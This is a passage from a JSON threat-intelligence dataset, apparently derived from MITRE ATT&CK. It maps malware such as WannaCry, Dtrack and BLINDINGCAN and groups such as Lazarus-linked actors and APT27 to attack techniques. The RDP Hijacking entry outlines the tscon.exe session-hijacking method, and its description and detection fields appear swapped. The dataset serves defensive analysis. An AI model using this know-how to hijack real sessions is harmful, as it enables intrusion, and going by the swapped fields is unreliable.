                    "Azure AD",
                    "Office 365",
                    "SaaS",
                    "IaaS",
                    "Linux",
                    "macOS",
                    "Google Workspace",
                    "Containers"
                ]
            }
        },
        {
            "id": "S0567",
            "type": "tool",
            "attributes": {
                "name": "Dtrack",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "Dtrack is spyware that was discovered in 2019 and has been used against Indian financial institutions, research facilities, and the Kudankulam Nuclear Power Plant. Dtrack shares similarities with the DarkSeoul campaign, which was attributed to Lazarus Group.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1074.001": "Local Data Staging",
                    "T1574": "Hijack Execution Flow",
                    "T1059.003": "Windows Command Shell",
                    "T1560": "Archive Collected Data",
                    "T1056.001": "Keylogging",
                    "T1036.005": "Match Legitimate Name or Location",
                    "T1070.004": "File Deletion",
                    "T1547": "Boot or Logon Autostart Execution",
                    "T1543.003": "Windows Service",
                    "T1055.012": "Process Hollowing",
                    "T1217": "Browser Bookmark Discovery",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1129": "Shared Modules",
                    "T1105": "Ingress Tool Transfer",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1078": "Valid Accounts",
                    "T1057": "Process Discovery",
                    "T1049": "System Network Connections Discovery",
                    "T1027": "Obfuscated Files or Information",
                    "T1016": "System Network Configuration Discovery",
                    "T1012": "Query Registry",
                    "T1005": "Data from Local System"
                }
            },
            "val": 23
        },
        {
            "id": "S0520",
            "type": "tool",
            "attributes": {
                "name": "BLINDINGCAN",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "BLINDINGCAN is a remote access Trojan that has been used by the North Korean government since at least early 2020 in cyber operations against defense, engineering, and government organizations in Western Europe and the US.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1573.001": "Symmetric Cryptography",
                    "T1071.001": "Web Protocols",
                    "T1132.001": "Standard Encoding",
                    "T1204.002": "Malicious File",
                    "T1059.003": "Windows Command Shell",
                    "T1566.001": "Spearphishing Attachment",
                    "T1036.005": "Match Legitimate Name or Location",
                    "T1553.002": "Code Signing",
                    "T1027.002": "Software Packing",
                    "T1070.006": "Timestomp",
                    "T1070.004": "File Deletion",
                    "T1218.011": "Rundll32",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1129": "Shared Modules",
                    "T1105": "Ingress Tool Transfer",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1041": "Exfiltration Over C2 Channel",
                    "T1027": "Obfuscated Files or Information",
                    "T1016": "System Network Configuration Discovery",
                    "T1005": "Data from Local System"
                }
            },
            "val": 21
        },
        {
            "id": "S0498",
            "type": "tool",
            "attributes": {
                "name": "Cryptoistic",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "Cryptoistic is a backdoor, written in Swift, that has been used by Lazarus Group.",
                "platforms": [
                    "macOS"
                ],
                "techniques": {
                    "T1573": "Encrypted Channel",
                    "T1070.004": "File Deletion",
                    "T1105": "Ingress Tool Transfer",
                    "T1095": "Non-Application Layer Protocol",
                    "T1083": "File and Directory Discovery",
                    "T1033": "System Owner/User Discovery",
                    "T1005": "Data from Local System"
                }
            },
            "val": 7
        },
        {
            "id": "S0497",
            "type": "tool",
            "attributes": {
                "name": "Dacls",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "Dacls is a multi-platform remote access tool used by Lazarus Group since at least December 2019.",
                "platforms": [
                    "macOS",
                    "Linux",
                    "Windows"
                ],
                "techniques": {
                    "T1071.001": "Web Protocols",
                    "T1564.001": "Hidden Files and Directories",
                    "T1543.004": "Launch Daemon",
                    "T1543.001": "Launch Agent",
                    "T1105": "Ingress Tool Transfer",
                    "T1083": "File and Directory Discovery",
                    "T1057": "Process Discovery",
                    "T1036": "Masquerading",
                    "T1027": "Obfuscated Files or Information"
                }
            },
            "val": 9
        },
        {
            "id": "S0431",
            "type": "tool",
            "attributes": {
                "name": "HotCroissant",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "HotCroissant is a remote access trojan (RAT) attributed by U.S. government entities to malicious North Korean government cyber activity, tracked collectively as HIDDEN COBRA. HotCroissant shares numerous code similarities with Rifdoor.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1573.001": "Symmetric Cryptography",
                    "T1564.003": "Hidden Window",
                    "T1059.003": "Windows Command Shell",
                    "T1027.002": "Software Packing",
                    "T1070.004": "File Deletion",
                    "T1053.005": "Scheduled Task",
                    "T1518": "Software Discovery",
                    "T1489": "Service Stop",
                    "T1113": "Screen Capture",
                    "T1106": "Native API",
                    "T1105": "Ingress Tool Transfer",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1057": "Process Discovery",
                    "T1041": "Exfiltration Over C2 Channel",
                    "T1033": "System Owner/User Discovery",
                    "T1027": "Obfuscated Files or Information",
                    "T1016": "System Network Configuration Discovery",
                    "T1010": "Application Window Discovery",
                    "T1007": "System Service Discovery"
                }
            },
            "val": 20
        },
        {
            "id": "S0376",
            "type": "tool",
            "attributes": {
                "name": "HOPLIGHT",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "HOPLIGHT is a backdoor Trojan that has reportedly been used by the North Korean government.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1132.001": "Standard Encoding",
                    "T1571": "Non-Standard Port",
                    "T1569.002": "Service Execution",
                    "T1059.003": "Windows Command Shell",
                    "T1562.004": "Disable or Modify System Firewall",
                    "T1003.002": "Security Account Manager",
                    "T1550.002": "Pass the Hash",
                    "T1124": "System Time Discovery",
                    "T1112": "Modify Registry",
                    "T1105": "Ingress Tool Transfer",
                    "T1090": "Proxy",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1065": "Uncommonly Used Port",
                    "T1055": "Process Injection",
                    "T1047": "Windows Management Instrumentation",
                    "T1043": "Commonly Used Port",
                    "T1041": "Exfiltration Over C2 Channel",
                    "T1012": "Query Registry",
                    "T1008": "Fallback Channels"
                }
            },
            "val": 20
        },
        {
            "id": "T1563.002",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "RDP Hijacking",
                "chain_phase": "lateral-movement",
                "description": "Consider monitoring processes for `tscon.exe` usage and monitor service creation that uses `cmd.exe /k` or `cmd.exe /c` in its arguments to detect RDP session hijacking.\n\nUse of RDP may be legitimate, depending on the network environment and how it is used. Other factors, such as access patterns and activity that occurs after a remote login, may indicate suspicious or malicious behavior with RDP.",
                "detection": "Adversaries may hijack a legitimate user’s remote desktop session to move laterally within an environment. Remote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS).\n\nAdversaries may perform RDP session hijacking which involves stealing a legitimate user's remote session. Typically, a user is notified when someone else is trying to steal their session. With System permissions and using Terminal Services Console, `c:\\windows\\system32\\tscon.exe session number to be stolen`, an adversary can hijack a session without the need for credentials or prompts to the user. This can be done remotely or locally and with active or disconnected sessions. It can also lead to Remote System Discovery and Privilege Escalation by stealing a Domain Admin or higher privileged account session. All of this can be done by using native Windows commands, but it has also been added as a feature in red teaming tools.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "S0366",
            "type": "tool",
            "attributes": {
                "name": "WannaCry",
                "aliases": [
                    "WanaCry",
                    "WanaCrypt",
                    "WanaCrypt0r",
                    "WCry"
                ],
                "labels": [
                    "malware"
                ],
                "description": "WannaCry is ransomware that was first seen in a global attack during May 2017, which affected more than 150 countries. It contains worm-like features to spread itself across a computer network using the SMBv1 exploit EternalBlue.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1573.002": "Asymmetric Cryptography",
                    "T1090.003": "Multi-hop Proxy",
                    "T1570": "Lateral Tool Transfer",
                    "T1564.001": "Hidden Files and Directories",
                    "T1563.002": "RDP Hijacking",
                    "T1222.001": "Windows File and Directory Permissions Modification",
                    "T1543.003": "Windows Service",
                    "T1490": "Inhibit System Recovery",
                    "T1489": "Service Stop",
                    "T1486": "Data Encrypted for Impact",
                    "T1210": "Exploitation of Remote Services",
                    "T1120": "Peripheral Device Discovery",
                    "T1083": "File and Directory Discovery",
                    "T1047": "Windows Management Instrumentation",
                    "T1018": "Remote System Discovery",
                    "T1016": "System Network Configuration Discovery",
                    "T0866": "Exploitation of Remote Services",
                    "T0822": "External Remote Services",
                    "T0867": "Lateral Tool Transfer"
                }
            },
            "val": 19
        },
        {
            "id": "S0364",
            "type": "tool",
            "attributes": {
                "name": "RawDisk",
                "aliases": [],
                "labels": [
                    "tool"
                ],
                "description": "RawDisk is a legitimate commercial driver from the EldoS Corporation that is used for interacting with files, disks, and partitions. The driver allows for direct modification of data on a local computer's hard drive. In some cases, the tool can enact these raw disk modifications from user-mode processes, circumventing Windows operating system security features.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1561.002": "Disk Structure Wipe",
                    "T1561.001": "Disk Content Wipe",
                    "T1485": "Data Destruction"
                }
            },
            "val": 3
        },
        {
            "id": "S0347",
            "type": "tool",
            "attributes": {
                "name": "AuditCred",
                "aliases": [
                    "Roptimizer"
                ],
                "labels": [
                    "malware"
                ],
                "description": "AuditCred is a malicious DLL that has been used by Lazarus Group during their 2018 attacks.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1059.003": "Windows Command Shell",
                    "T1070.004": "File Deletion",
                    "T1543.003": "Windows Service",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1105": "Ingress Tool Transfer",
                    "T1090": "Proxy",
                    "T1083": "File and Directory Discovery",
                    "T1055": "Process Injection",
                    "T1043": "Commonly Used Port",
                    "T1027": "Obfuscated Files or Information"
                }
            },
            "val": 10
        },
        {
            "id": "S0245",
            "type": "tool",
            "attributes": {
                "name": "BADCALL",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "BADCALL is a Trojan malware variant used by the group Lazarus Group.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1573.001": "Symmetric Cryptography",
                    "T1001.003": "Protocol Impersonation",
                    "T1571": "Non-Standard Port",
                    "T1562.004": "Disable or Modify System Firewall",
                    "T1112": "Modify Registry",
                    "T1090": "Proxy",
                    "T1082": "System Information Discovery",
                    "T1043": "Commonly Used Port",
                    "T1016": "System Network Configuration Discovery"
                }
            },
            "val": 9
        },
        {
            "id": "S0246",
            "type": "tool",
            "attributes": {
                "name": "HARDRAIN",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "HARDRAIN is a Trojan malware variant reportedly used by the North Korean government.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1001.003": "Protocol Impersonation",
                    "T1571": "Non-Standard Port",
                    "T1059.003": "Windows Command Shell",
                    "T1562.004": "Disable or Modify System Firewall",
                    "T1090": "Proxy",
                    "T1043": "Commonly Used Port"
                }
            },
            "val": 6
        },
        {
            "id": "S0241",
            "type": "tool",
            "attributes": {
                "name": "RATANKBA",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "RATANKBA is a remote controller tool used by Lazarus Group. RATANKBA has been used in attacks targeting financial institutions in Poland, Mexico, Uruguay, the United Kingdom, and Chile. It was also seen used against organizations related to telecommunications, management consulting, information technology, insurance, aviation, and education. RATANKBA has a graphical user interface to allow the attacker to issue jobs to perform on the infected machines.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1071.001": "Web Protocols",
                    "T1059.003": "Windows Command Shell",
                    "T1059.001": "PowerShell",
                    "T1087.001": "Local Account",
                    "T1055.001": "Dynamic-link Library Injection",
                    "T1105": "Ingress Tool Transfer",
                    "T1082": "System Information Discovery",
                    "T1057": "Process Discovery",
                    "T1049": "System Network Connections Discovery",
                    "T1047": "Windows Management Instrumentation",
                    "T1043": "Commonly Used Port",
                    "T1033": "System Owner/User Discovery",
                    "T1018": "Remote System Discovery",
                    "T1016": "System Network Configuration Discovery",
                    "T1012": "Query Registry",
                    "T1007": "System Service Discovery"
                }
            },
            "val": 16
        },
        {
            "id": "S0239",
            "type": "tool",
            "attributes": {
                "name": "Bankshot",
                "aliases": [
                    "Trojan Manuscript"
                ],
                "labels": [
                    "malware"
                ],
                "description": "Bankshot is a remote access tool (RAT) that was first reported by the Department of Homeland Security in December of 2017. In 2018, Lazarus Group used the Bankshot implant in attacks against the Turkish financial sector.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1071.001": "Web Protocols",
                    "T1001.003": "Protocol Impersonation",
                    "T1132.002": "Non-Standard Encoding",
                    "T1571": "Non-Standard Port",
                    "T1059.003": "Windows Command Shell",
                    "T1087.002": "Domain Account",
                    "T1087.001": "Local Account",
                    "T1134.002": "Create Process with Token",
                    "T1070.006": "Timestomp",
                    "T1070.004": "File Deletion",
                    "T1543.003": "Windows Service",
                    "T1203": "Exploitation for Client Execution",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1119": "Automated Collection",
                    "T1112": "Modify Registry",
                    "T1106": "Native API",
                    "T1105": "Ingress Tool Transfer",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1070": "Indicator Removal on Host",
                    "T1065": "Uncommonly Used Port",
                    "T1057": "Process Discovery",
                    "T1041": "Exfiltration Over C2 Channel",
                    "T1012": "Query Registry",
                    "T1005": "Data from Local System"
                }
            },
            "val": 25
        },
        {
            "id": "S0271",
            "type": "tool",
            "attributes": {
                "name": "KEYMARBLE",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "KEYMARBLE is a Trojan that has reportedly been used by the North Korean government.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1573.001": "Symmetric Cryptography",
                    "T1059.003": "Windows Command Shell",
                    "T1070.004": "File Deletion",
                    "T1113": "Screen Capture",
                    "T1112": "Modify Registry",
                    "T1105": "Ingress Tool Transfer",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1057": "Process Discovery",
                    "T1043": "Commonly Used Port",
                    "T1016": "System Network Configuration Discovery"
                }
            },
            "val": 11
        },
        {
            "id": "S0238",
            "type": "tool",
            "attributes": {
                "name": "Proxysvc",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "Proxysvc is a malicious DLL used by Lazarus Group in a campaign known as Operation GhostSecret. It has appeared to be operating undetected since 2017 and was mostly observed in higher education organizations. The goal of Proxysvc is to deliver additional payloads to the target and to maintain control for the attacker. It is in the form of a DLL that can also be executed as a standalone process.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1071.001": "Web Protocols",
                    "T1569.002": "Service Execution",
                    "T1059.003": "Windows Command Shell",
                    "T1070.004": "File Deletion",
                    "T1485": "Data Destruction",
                    "T1124": "System Time Discovery",
                    "T1119": "Automated Collection",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1057": "Process Discovery",
                    "T1043": "Commonly Used Port",
                    "T1041": "Exfiltration Over C2 Channel",
                    "T1016": "System Network Configuration Discovery",
                    "T1012": "Query Registry",
                    "T1005": "Data from Local System"
                }
            },
            "val": 15
        },
        {
            "id": "S0263",
            "type": "tool",
            "attributes": {
                "name": "TYPEFRAME",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "TYPEFRAME is a remote access tool that has been used by Lazarus Group.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1571": "Non-Standard Port",
                    "T1204.002": "Malicious File",
                    "T1059.005": "Visual Basic",
                    "T1059.003": "Windows Command Shell",
                    "T1562.004": "Disable or Modify System Firewall",
                    "T1070.004": "File Deletion",
                    "T1543.003": "Windows Service",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1112": "Modify Registry",
                    "T1105": "Ingress Tool Transfer",
                    "T1094": "Custom Command and Control Protocol",
                    "T1090": "Proxy",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1065": "Uncommonly Used Port",
                    "T1043": "Commonly Used Port",
                    "T1027": "Obfuscated Files or Information"
                }
            },
            "val": 17
        },
        {
            "id": "S0180",
            "type": "tool",
            "attributes": {
                "name": "Volgmer",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "Volgmer is a backdoor Trojan designed to provide covert access to a compromised system. It has been used since at least 2013 to target the government, financial, automotive, and media industries. Its primary delivery mechanism is suspected to be spearphishing.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1573.002": "Asymmetric Cryptography",
                    "T1573.001": "Symmetric Cryptography",
                    "T1059.003": "Windows Command Shell",
                    "T1036.004": "Masquerade Task or Service",
                    "T1070.004": "File Deletion",
                    "T1543.003": "Windows Service",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1112": "Modify Registry",
                    "T1106": "Native API",
                    "T1105": "Ingress Tool Transfer",
                    "T1094": "Custom Command and Control Protocol",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1065": "Uncommonly Used Port",
                    "T1057": "Process Discovery",
                    "T1049": "System Network Connections Discovery",
                    "T1043": "Commonly Used Port",
                    "T1027": "Obfuscated Files or Information",
                    "T1016": "System Network Configuration Discovery",
                    "T1012": "Query Registry",
                    "T1007": "System Service Discovery"
                }
            },
            "val": 21
        },
        {
            "id": "S0181",
            "type": "tool",
            "attributes": {
                "name": "FALLCHILL",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "FALLCHILL is a RAT that has been used by Lazarus Group since at least 2016 to target the aerospace, telecommunications, and finance industries. It is usually dropped by other Lazarus Group malware or delivered when a victim unknowingly visits a compromised website.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1573.001": "Symmetric Cryptography",
                    "T1001.003": "Protocol Impersonation",
                    "T1070.006": "Timestomp",
                    "T1070.004": "File Deletion",
                    "T1543.003": "Windows Service",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1016": "System Network Configuration Discovery"
                }
            },
            "val": 8
        },
        {
            "id": "G0031",
            "type": "group",
            "attributes": {
                "val": 4,
                "name": "Dust Storm",
                "aliases": [],
                "description": "Dust Storm is a threat group that has targeted multiple industries in Japan, South Korea, the United States, Europe, and several Southeast Asian countries.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0086": "ZLib",
                    "S0085": "S-Type",
                    "S0084": "Mis-Type",
                    "S0083": "Misdat"
                },
                "techniques": {
                    "T1083": "File and Directory Discovery",
                    "T1027": "Obfuscated Files or Information",
                    "T1005": "Data from Local System"
                }
            }
        },
        {
            "id": "S0086",
            "type": "tool",
            "attributes": {
                "name": "ZLib",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "ZLib is a full-featured backdoor that was used as a second-stage implant by Dust Storm from 2014 to 2015. It is malware and should not be confused with the compression library from which its name is derived.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1071.001": "Web Protocols",
                    "T1059.003": "Windows Command Shell",
                    "T1560.002": "Archive via Library",
                    "T1036.005": "Match Legitimate Name or Location",
                    "T1543.003": "Windows Service",
                    "T1113": "Screen Capture",
                    "T1105": "Ingress Tool Transfer",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1007": "System Service Discovery"
                }
            },
            "val": 10
        },
        {
            "id": "S0085",
            "type": "tool",
            "attributes": {
                "name": "S-Type",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "S-Type is a backdoor that was used by Dust Storm from 2013 to 2014.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1071.001": "Web Protocols",
                    "T1132.001": "Standard Encoding",
                    "T1087.001": "Local Account",
                    "T1036.005": "Match Legitimate Name or Location",
                    "T1136.001": "Local Account",
                    "T1547.009": "Shortcut Modification",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1082": "System Information Discovery",
                    "T1043": "Commonly Used Port",
                    "T1008": "Fallback Channels",
                    "T1007": "System Service Discovery"
                }
            },
            "val": 11
        },
        {
            "id": "S0084",
            "type": "tool",
            "attributes": {
                "name": "Mis-Type",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "Mis-Type is a backdoor hybrid that was used by Dust Storm in 2012.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1071.001": "Web Protocols",
                    "T1132.001": "Standard Encoding",
                    "T1059.003": "Windows Command Shell",
                    "T1087.001": "Local Account",
                    "T1036.005": "Match Legitimate Name or Location",
                    "T1136.001": "Local Account",
                    "T1095": "Non-Application Layer Protocol",
                    "T1094": "Custom Command and Control Protocol",
                    "T1082": "System Information Discovery",
                    "T1043": "Commonly Used Port",
                    "T1033": "System Owner/User Discovery",
                    "T1016": "System Network Configuration Discovery",
                    "T1008": "Fallback Channels"
                }
            },
            "val": 13
        },
        {
            "id": "S0083",
            "type": "tool",
            "attributes": {
                "name": "Misdat",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "Misdat is a backdoor that was used by Dust Storm from 2010 to 2011.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1132.001": "Standard Encoding",
                    "T1059.003": "Windows Command Shell",
                    "T1036.005": "Match Legitimate Name or Location",
                    "T1070.006": "Timestomp",
                    "T1070.004": "File Deletion",
                    "T1105": "Ingress Tool Transfer",
                    "T1095": "Non-Application Layer Protocol",
                    "T1094": "Custom Command and Control Protocol",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1070": "Indicator Removal on Host",
                    "T1043": "Commonly Used Port"
                }
            },
            "val": 12
        },
        {
            "id": "G0030",
            "type": "group",
            "attributes": {
                "val": 2,
                "name": "Lotus Blossom",
                "aliases": [
                    "DRAGONFISH",
                    "Spring Dragon"
                ],
                "description": "Lotus Blossom is a threat group that has targeted government and military organizations in Southeast Asia.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0082": "Emissary",
                    "S0081": "Elise"
                },
                "techniques": {}
            }
        },
        {
            "id": "S0082",
            "type": "tool",
            "attributes": {
                "name": "Emissary",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "Emissary is a Trojan that has been used by Lotus Blossom. It shares code with Elise, with both Trojans being part of a malware group referred to as LStudio.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1573.001": "Symmetric Cryptography",
                    "T1071.001": "Web Protocols",
                    "T1069.001": "Local Groups",
                    "T1059.003": "Windows Command Shell",
                    "T1027.001": "Binary Padding",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1218.011": "Rundll32",
                    "T1543.003": "Windows Service",
                    "T1055.001": "Dynamic-link Library Injection",
                    "T1105": "Ingress Tool Transfer",
                    "T1082": "System Information Discovery",
                    "T1027": "Obfuscated Files or Information",
                    "T1016": "System Network Configuration Discovery",
                    "T1007": "System Service Discovery"
                }
            },
            "val": 14
        },
        {
            "id": "S0081",
            "type": "tool",
            "attributes": {
                "name": "Elise",
                "aliases": [
                    "BKDR_ESILE",
                    "Page"
                ],
                "labels": [
                    "malware"
                ],
                "description": "Elise is a custom backdoor Trojan that appears to be used exclusively by Lotus Blossom. It is part of a larger group of\ntools referred to as LStudio, ST Group, and APT0LSTU.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1573.001": "Symmetric Cryptography",
                    "T1071.001": "Web Protocols",
                    "T1132.001": "Standard Encoding",
                    "T1074.001": "Local Data Staging",
                    "T1087.001": "Local Account",
                    "T1036.005": "Match Legitimate Name or Location",
                    "T1070.006": "Timestomp",
                    "T1070.004": "File Deletion",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1218.011": "Rundll32",
                    "T1543.003": "Windows Service",
                    "T1055.001": "Dynamic-link Library Injection",
                    "T1105": "Ingress Tool Transfer",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1057": "Process Discovery",
                    "T1027": "Obfuscated Files or Information",
                    "T1016": "System Network Configuration Discovery",
                    "T1007": "System Service Discovery"
                }
            },
            "val": 19
        },
        {
            "id": "G0029",
            "type": "group",
            "attributes": {
                "val": 4,
                "name": "Scarlet Mimic",
                "aliases": [],
                "description": "Scarlet Mimic is a threat group that has targeted minority rights activists. This group has not been directly linked to a government source, but the group's motivations appear to overlap with those of the Chinese government. While there is some overlap between IP addresses used by Scarlet Mimic and Putter Panda, it has not been concluded that the groups are the same.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0079": "MobileOrder",
                    "S0078": "Psylo",
                    "S0077": "CallMe",
                    "S0076": "FakeM"
                },
                "techniques": {
                    "T1036.002": "Right-to-Left Override"
                }
            }
        },
        {
            "id": "S0079",
            "type": "tool",
            "attributes": {
                "name": "MobileOrder",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "MobileOrder is a Trojan intended to compromise Android mobile devices. It has been used by Scarlet Mimic.",
                "platforms": [],
                "techniques": {
                    "T1217": "Browser Bookmark Discovery",
                    "T1105": "Ingress Tool Transfer",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1065": "Uncommonly Used Port",
                    "T1057": "Process Discovery",
                    "T1041": "Exfiltration Over C2 Channel",
                    "T1032": "Standard Cryptographic Protocol",
                    "T1005": "Data from Local System"
                }
            },
            "val": 9
        },
        {
            "id": "S0078",
            "type": "tool",
            "attributes": {
                "name": "Psylo",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "Psylo is a shellcode-based Trojan that has been used by Scarlet Mimic. It has similar characteristics as FakeM.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1071.001": "Web Protocols",
                    "T1070.006": "Timestomp",
                    "T1105": "Ingress Tool Transfer",
                    "T1083": "File and Directory Discovery",
                    "T1041": "Exfiltration Over C2 Channel"
                }
            },
            "val": 5
        },
        {
            "id": "S0077",
            "type": "tool",
            "attributes": {
                "name": "CallMe",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "CallMe is a Trojan designed to run on Apple OSX. It is based on a publicly available tool called Tiny SHell.",
                "platforms": [
                    "macOS"
                ],
                "techniques": {
                    "T1573.001": "Symmetric Cryptography",
                    "T1059.004": "Unix Shell",
                    "T1105": "Ingress Tool Transfer",
                    "T1041": "Exfiltration Over C2 Channel"
                }
            },
            "val": 4
        },
        {
            "id": "S0076",
            "type": "tool",
            "attributes": {
                "name": "FakeM",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "FakeM is a shellcode-based Windows backdoor that has been used by Scarlet Mimic.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1573.001": "Symmetric Cryptography",
                    "T1001.003": "Protocol Impersonation",
                    "T1056.001": "Keylogging",
                    "T1095": "Non-Application Layer Protocol"
                }
            },
            "val": 4
        },
        {
            "id": "G0028",
            "type": "group",
            "attributes": {
                "val": 2,
                "name": "Threat Group-1314",
                "aliases": [
                    "TG-1314"
                ],
                "description": "Threat Group-1314 is an unattributed threat group that has used compromised credentials to log into a victim's remote access infrastructure.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0039": "Net",
                    "S0029": "PsExec"
                },
                "techniques": {
                    "T1078.002": "Domain Accounts",
                    "T1059.003": "Windows Command Shell",
                    "T1021.002": "SMB/Windows Admin Shares",
                    "T1072": "Software Deployment Tools"
                }
            }
        },
        {
            "id": "G0027",
            "type": "group",
            "attributes": {
                "val": 16,
                "name": "Threat Group-3390",
                "aliases": [
                    "TG-3390",
                    "Emissary Panda",
                    "BRONZE UNION",
                    "APT27",
                    "Iron Tiger",
                    "LuckyMouse"
                ],
                "description": "Threat Group-3390 is a Chinese threat group that has extensively used strategic Web compromises to target victims.  The group has been active since at least 2010 and has targeted organizations in the aerospace, government, defense, technology, energy, and manufacturing sectors.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0590": "NBTscan",
                    "S0412": "ZxShell",
                    "S0398": "HyperBro",
                    "S0357": "Impacket",
                    "S0100": "ipconfig",
                    "S0073": "ASPXSpy",
                    "S0072": "OwaAuth",
                    "S0070": "HTTPBrowser",
                    "S0039": "Net",
                    "S0032": "gh0st RAT",
                    "S0020": "China Chopper",
                    "S0013": "PlugX",
                    "S0008": "gsecdump",
                    "S0006": "pwdump",
                    "S0005": "Windows Credential Editor",
                    "S0002": "Mimikatz"
                },
                "techniques": {
                    "T1608.004": "Drive-by Target",
                    "T1608.002": "Upload Tool",
                    "T1071.001": "Web Protocols",
                    "T1074.002": "Remote Data Staging",
                    "T1074.001": "Local Data Staging",
                    "T1574.002": "DLL Side-Loading",
                    "T1574.001": "DLL Search Order Hijacking",
                    "T1059.003": "Windows Command Shell",
                    "T1059.001": "PowerShell",
                    "T1087.001": "Local Account",
                    "T1562.002": "Disable Windows Event Logging",
                    "T1003.004": "LSA Secrets",
                    "T1560.002": "Archive via Library",
                    "T1056.001": "Keylogging",
                    "T1003.002": "Security Account Manager",
                    "T1003.001": "LSASS Memory",
                    "T1021.006": "Windows Remote Management",
                    "T1070.005": "Network Share Connection Removal",
                    "T1070.004": "File Deletion",
                    "T1548.002": "Bypass User Account Control",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1543.003": "Windows Service",
                    "T1055.012": "Process Hollowing",
                    "T1505.003": "Web Shell",
                    "T1053.002": "At (Windows)",
                    "T1189": "Drive-by Compromise",
                    "T1210": "Exploitation of Remote Services",
                    "T1203": "Exploitation for Client Execution",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1133": "External Remote Services",
                    "T1119": "Automated Collection",
                    "T1112": "Modify Registry",
                    "T1105": "Ingress Tool Transfer",
                    "T1078": "Valid Accounts",
